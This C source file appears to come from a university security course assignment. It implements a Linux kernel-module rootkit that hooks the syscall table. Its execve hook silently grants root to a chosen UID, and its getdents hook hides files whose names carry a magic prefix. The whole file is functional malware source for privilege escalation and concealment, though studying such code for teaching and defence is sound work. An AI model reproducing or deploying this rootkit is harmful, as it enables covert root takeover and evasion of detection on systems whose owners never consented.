/*
 * The augmented skeleton for this code was provided by COMP4108 W20 TAs but was originally written by Legion.
 */

#include "rootkit.h"

/*
 * The sys_call_table is an array of void pointers.
 *
 * Since Linux kernel version 2.6.x the sys_call_table symbol is no longer
 * exported, meaning we can't use kallsyms to find where it lives in memory
 * instead you'll have to grep "sys_call_table" /boot/System.map-$(uname -r)
 * and hardcode the resulting memory address into your module before compiling
 * Baby steps!
 */
static void** sys_call_table;

/*
 * We need to maintain a doubly linked list of the t_syscall_hooks we have in
 * place such that we can restore them later.
 */
static t_syscall_hook_list* hooks;

/*
 * The address of the sys_call_table will be provided as a kernel module
 * parameter named table_addr at the time of insmod (SEE insert.sh)
 */
static unsigned long table_addr;
module_param(table_addr, ulong, 0);
MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");

/*
 * When a user with an effective UID = root_uid runs a command via execve()
 * we make our hook grant them root priv. root_uid's value is provided as a
 * kernel module argument.
 */
static int root_uid;
module_param(root_uid, int, 1);
MODULE_PARM_DESC(root_uid, "UID to be changed to be to root");

/*
 * Files that start with a prefix matching magic_prefix are removed from the
 * linux_dirent* buffer that is returned to the caller of getdents()
 */
static char* magic_prefix;
module_param(magic_prefix, charp, 1);
MODULE_PARM_DESC(magic_prefix, "Prefix of files not to be shown");

/*
 * RW/RO page flip code borrowed from Cormander's TPE-LKM code.
 * Simplified for our purpose, i.e. one kernel version, one arch.
 *
 * Sets the page of memory containing the given addr to read/write.
 */
void set_addr_rw(const unsigned long addr) {
    unsigned int level;

    //Get the page table entry structure containing the address we pass.
    //Level will be set to the page depth for the entry.
    pte_t *pte = lookup_address(addr, &level);

    //If the page permissions bitmask doesn't have _PAGE_RW, mask it in
    //with the _PAGE_RW flag.
    if (pte->pte & ~_PAGE_RW)
        pte->pte |= _PAGE_RW;
}

/*
 * Sets the page of memory containing the provided addr to read only
 */
void set_addr_ro(const unsigned long addr) {
    unsigned int level;

    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

/*
 * Hooks a syscall storing the original sycall function for later restoration.
 * Returns 1 for a successful hook, 0 otherwise.
 */
int hook_syscall(t_syscall_hook *hook) {
    //If this syscall_hook has already been put in place, abort.
    if (hook->hooked)
        return 0;

    //Get & store the original syscall from the syscall_table using the offset
    hook->orig_func = sys_call_table[hook->offset];

    printk(KERN_INFO "Hooking offset %d. Original: %p to New:  %p\n",
            hook->offset, hook->orig_func, hook->hook_func);

    //********
    //	Since linux-kernel ~2.6.24  the sys_call_table has been in read-only
    //	memory. We need to mark it rw ourselves (we're root afterall), replace
    //	the syscall	function pointer, and then tidy up after ourselves.
    //********

    //Make RW
    set_addr_rw(table_addr);

    sys_call_table[hook->offset] = hook->hook_func;

    //Make RO
    set_addr_ro(table_addr);

    //Remember that we enabled the hook
    hook->hooked = true;
    return hook->hooked;
}

/*
 * Unhooks a syscall by restoring the original function.
 * Returns 1 for a successful unhook, 0 otherwise.
 */
int unhook_syscall(t_syscall_hook *hook) {
    //If it isn't hooked, we don't want to unhook it
    if (!hook->hooked)
        return 0;

    printk(KERN_INFO "Unhooking offset %d back to  %p\n", hook->offset, hook->orig_func);

    //Make RW
    set_addr_rw(table_addr);

    sys_call_table[hook->offset] = hook->orig_func;

    //Make RO
    set_addr_ro(table_addr);

    //Remember we've undone the hook
    hook->hooked = false;
    return !hook->hooked;
}

/*
 * Finds the t_syscall_hook in our hook linked list that is hooking
 * the given offset. Returns 0 if not found.
 */
t_syscall_hook *find_syscall_hook(const unsigned int offset) {
    struct list_head *element;
    t_syscall_hook_list *hook_entry;
    t_syscall_hook *hook;

    list_for_each(element, &(hooks->list))
    {
        hook_entry = list_entry(element, t_syscall_hook_list, list);
        hook = hook_entry->hook;

        if (hook->offset == offset)
            return hook;
    }

    return 0;
}

/*
 * Allocates a new t_syscall_hook populated to hook the given offset with the
 * supplied newFunc function pointer. The t_syscall_hook will automatically be
 * added to the hooks linked list.
 *
 * Note: the syscall will not be hooked yet, you still need to call
 * hook_syscall() with the t_syscall_hook struct returned by new_hook()
 */
t_syscall_hook *new_hook(const unsigned int offset, void *newFunc) {
    t_syscall_hook *hook;
    t_syscall_hook_list *new_link;

    //Allocate & init the hook
    hook = kmalloc(sizeof(t_syscall_hook), GFP_KERNEL);
    hook->hooked = false;
    hook->orig_func = NULL;
    hook->hook_func = newFunc;
    hook->offset = offset;

    //Allocate and init the list entry
    new_link = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
    new_link->hook = hook;

    //Add the link into the hooks list
    list_add(&(new_link->list), &(hooks->list));

    //Return the hook
    return new_link->hook;
}

/*
 * Module initialization callback
 */
int init_module(void) {
    printk(KERN_INFO "Rootkit module initalizing.\n");

    //Allocate & init a list to store our syscall_hooks
    hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
    INIT_LIST_HEAD(&(hooks->list));

    //We need to hardcode the sys_call_table's location in memory. Remember array
    //indices in C are offsets from the base (i.e. 0th idex) address of the array.
    sys_call_table = (void *) table_addr;
    printk(KERN_INFO "Syscall table loaded from %p\n", (void *) table_addr);

    //Let's hook execve() for privilege escalation
    hook_syscall(new_hook(__NR_execve, (void *) &new_execve));

    //Let's hook getdents() to hide our files
    hook_syscall(new_hook(__NR_getdents, (void *) &new_getdents));

    printk(KERN_INFO "Rootkit module is loaded!\n");
    return 0; //For successful load
}

/*
 * Module destructor callback
 */
void cleanup_module(void) {
    struct list_head *element;
    struct list_head *tmp;
    t_syscall_hook_list *hook_entry;
    t_syscall_hook *hook;

    printk(KERN_INFO "Rootkit module unloaded\n");

    //Iterate through the linked list of hook_entry's unhooking and deallocating
    //each as we go. We use the safe list_for_each because we are removing
    //elements.
    list_for_each_safe(element, tmp, &(hooks->list))
    {
        hook_entry = list_entry(element, t_syscall_hook_list, list);
        hook = hook_entry->hook;

        printk(KERN_INFO "Freeing my hook - offset %d\n", hook->offset);

        if (hook->hooked)
            unhook_syscall(hook_entry->hook);

        list_del(element);
        kfree(hook_entry);
    }

    printk(KERN_INFO "Rootkit module cleanup complete\n");
}

/*
 * The execve syscall is normally responsible for executing programs.
 *
 * Our exploitation elevates a pre-specified user to root when they try to execute a program
 */
asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {

    //Declare function pointer signature that matches original execve and declare hook
    int (*orig_func)(const char *filename, char *const argv[], char *const envp[]);
    t_syscall_hook *execve_hook;

    //Find the t_syscall_hook for __NR_execve from our linked list and store original function
    execve_hook = find_syscall_hook(__NR_execve);
    orig_func = (void *) execve_hook->orig_func;

    //Augment privileges if the current user's ID matches the input given to the kernel module
    if (current_uid() == root_uid) {
        struct cred *new_cred = prepare_kernel_cred(0);
        commit_creds(new_cred);
    }

    //Invoke original syscall
    return (*orig_func)(filename, argv, envp);
}

/*
 * The getdents syscall normally returns a buffer with directory entry information (not an array).
 * Each dirent has a reclen that states the distance to the next dirent.
 *
 * Our exploitation looks for filenames with a prefix that matches the input given to the kernel
 * module and changes the reclen of the previous file to skip over our malicious files.
 */
asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int count) {

    //Declare function pointer signature that matches original getdents and declare hook
    int (*orig_func)(unsigned int fd, linux_dirent *dirp, unsigned int count);
    t_syscall_hook *getdents_hook;

    //Declarations for buffer manipulation and copying
    int buffer_pos, buffer_size;
    linux_dirent *d, *d_next, *dirp_copy;

    //Find the t_syscall_hook for __NR_getdents from our linked list and store original function
    getdents_hook = find_syscall_hook(__NR_getdents);
    orig_func = (void *) getdents_hook->orig_func;

    //Execute original function to populate buffer_size and dirp
    buffer_size = (*orig_func)(fd, dirp, count);

    //Copy dirp because we cannot edit userland memory from the kernel
    dirp_copy = (void *) kmalloc(buffer_size, GFP_USER);
    copy_from_user(dirp_copy, dirp, buffer_size);

    for (buffer_pos = 0; buffer_pos < buffer_size;) {

        d = (linux_dirent *) (((char *) dirp_copy) + buffer_pos); // Get current dirent
        d_next = (linux_dirent *) (((char *) d) + d->d_reclen); // Look ahead to next dirent

        if (strstr(((char*) d_next->d_name), magic_prefix)){
            //If d_next has magic prefix increment d's reclen by d_next's reclen to skip d_next in
            //future dirent traversals, such as those done by 'ls'
            d->d_reclen += d_next->d_reclen;
        }
        buffer_pos += d->d_reclen;
    }

    //Copy edited dirp back to userland and free kernel memory
    copy_to_user(dirp, dirp_copy, buffer_size);
    kfree(dirp_copy);

    return buffer_size;
}
